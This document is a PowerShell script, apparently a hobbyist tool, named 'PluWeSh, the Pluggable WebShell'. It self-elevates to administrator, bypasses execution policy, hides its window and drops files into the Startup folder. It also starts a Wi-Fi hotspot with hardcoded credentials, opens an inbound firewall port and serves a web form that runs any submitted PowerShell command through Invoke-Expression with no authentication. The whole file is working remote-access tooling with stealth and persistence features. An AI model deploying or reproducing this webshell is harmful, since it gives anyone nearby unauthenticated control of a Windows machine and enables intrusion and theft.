<# 
    Imagined by w01f
    https://w01f.xyz/

    Thank you :)

#>

# Run as administrator
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }

$ds = [Environment]::GetFolderPath("Startup");
$Wsh = New-Object -comObject WScript.Shell
$sct = $Wsh.CreateShortcut("./config.ps1")
$sct.TargetPath = "$ds"
$sct.Save()
$content = 'start notepad.exe'| Out-File -FilePath $ds\opennotepad.bat


Add-Type -AssemblyName System.Web

$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

$configuration = new-object Windows.Networking.NetworkOperators.NetworkOperatorTetheringAccessPointConfiguration

# ======================================= configuration: =======================================


# Webserver port
$port = 1338

# Webserver URL
$url = "http://*:$($port)/"


<# SSID for hotspot name
    The SSID is encoded using the Microsoft code page for the system's default locale.
    This SSID may appear differently in the Windows network selection UI on a system 
    that uses a different system locale. It is highly recommended that you set the 
    value using characters from the standard ASCII printable character set to avoid 
    any cross-locale inconsistencies.
#>
$configuration.Ssid = "PluWeSh"

# Passphrase (As detailed in the 802.11 specification, a passphrase must contain between 8 and 63 characters in the standard ASCII printable character set.)
$configuration.Passphrase = "pluweshpass"

# Wifi band (GHz)
<#
FIELDS
    Auto -> 0	
        Specifies that the WiFi adapter is free to choose any band per internal logic.

    FiveGigahertz -> 2	
        Specifies that the WiFi adapter uses only the 5 GHz band.

    TwoPointFourGigahertz -> 1	
        Specifies that the WiFi adapter uses only the 2.4 GHz band.
#>

$configuration.Band = 0

# ==============================================================================================


# ======================================== Access Point: =======================================

try {


    Add-Type -AssemblyName System.Runtime.WindowsRuntime
    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
    Function Await($WinRtTask, $ResultType) {
        $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
        $netTask = $asTask.Invoke($null, @($WinRtTask))
        $netTask.Wait(-1) | Out-Null
    }

    Function AwaitAction($WinRtAction) {
        $asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and !$_.IsGenericMethod })[0]
        $netTask = $asTask.Invoke($null, @($WinRtAction))
        $netTask.Wait(-1) | Out-Null
    }


    $connectionProfile = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetInternetConnectionProfile()
    $tetheringManager = [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking.NetworkOperators,ContentType=WindowsRuntime]::CreateFromConnectionProfile($connectionProfile)



    # Use above configuration for the new AP
    AwaitAction ($tetheringManager.ConfigureAccessPointAsync($configuration))


    # Start AP
    Await ($tetheringManager.StartTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])

} catch {
# Errors...
# Silence.
}

# ==============================================================================================

# Add Firewall rule (this needs admin rights)
# This is needed to access the web server from another device in the LAN
netsh advfirewall firewall add rule name="$($port) ps Server" dir=in action=allow protocol=TCP localport=$($port)


# ============================================= Website: =======================================
 
$template = @'
<!DOCTYPE HTML>
<html>
    <head>
        <title>PluWeSh</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style type="text/css">
            html, body, #container {height:95%}
            body {font-family:verdana;line-height:1.5;background-color:#1c1c1c}
            form, #container, p {align-items:center;display:flex;flex-direction:column;justify-content:center; color:#7d397d;}
            input, textarea {border:1px solid #306468;border-radius:4px;margin-bottom:10px;padding:4px;background-color: #232029; color:#56829b}
            input[type=submit] {padding:6px 10px}
            label, p {font-size:10px;padding-bottom:2px;text-transform:uppercase}
            h1 {margin-bottom:0px;color: #217f85;}
        </style>
    </head>
    <body>
        <div id="container">
        <h1>PluWeSh</h1>
        <h5>The Pluggable WebShell</h5>
            <div id="content">
                {page}
            </div>
        </div>
    </body>
</html>
'@

# Command submitting form
$form = @'
<form method="post">
    <label for="cmnd">Command (Powershell only)</label>
    <input type="textarea" name="cmnd" value="" placeholder="start cmd" required />
    <input type="submit" name="submit" value="Submit" />
</form>

<textarea readonly placeholder="Output..." rows="8" cols="40">
{rslt}  
</textarea>
'@


# request actions.
$routes = @{
  'GET /'  = { return (render $template $form) }
  'POST /' = {
    # get post data.
    $data = extract $request

    # get the submitted name.
    $cmnd = [System.Web.HttpUtility]::UrlDecode($data.item('cmnd'))

    # Command execution
    $rslt = Invoke-Expression $cmnd
    
    # render the 'form' snippet, passing the result.
    $page = render $form @{rslt = $rslt}


    # embed the snippet into the template.
    return (render $template $page)
  }
}

# embed content into the default template.
function render($template, $content) {
  # shorthand for rendering the template.
  if ($content -is [string]) { $content = @{page = $content} }
  if ($rslt -is [string]) { $rslt = @{rslt = $rslt} }

  #check for {xxx}'s to replace them with the corresponding data
  foreach ($key in $content.keys) {
    $template = $template -replace "{$key}", $content[$key]
  }

  return $template
}

# get post data from the input stream.
function extract($request) {
  $length = $request.contentlength64
  $buffer = new-object "byte[]" $length

  [void]$request.inputstream.read($buffer, 0, $length)
  $body = [system.text.encoding]::ascii.getstring($buffer)

  $data = @{}
  $body.split('&') | %{
    $part = $_.split('=')
    $data.add($part[0], $part[1])

  }

  return $data

}

#Create listener
$listener = new-object system.net.httplistener
$listener.prefixes.add($url)
$listener.start()



while ($listener.islistening) {
  $context = $listener.getcontext()
  $request = $context.request
  $response = $context.response

  $pattern = "{0} {1}" -f $request.httpmethod, $request.url.localpath
  $route = $routes.get_item($pattern)

  if ($route -eq $null) {
    $response.statuscode = 404
  } else {
    $content = & $route
    $buffer = [system.text.encoding]::utf8.getbytes($content)
    $response.contentlength64 = $buffer.length
    $response.outputstream.write($buffer, 0, $buffer.length)
  }

  $response.close()
}
# ==============================================================================================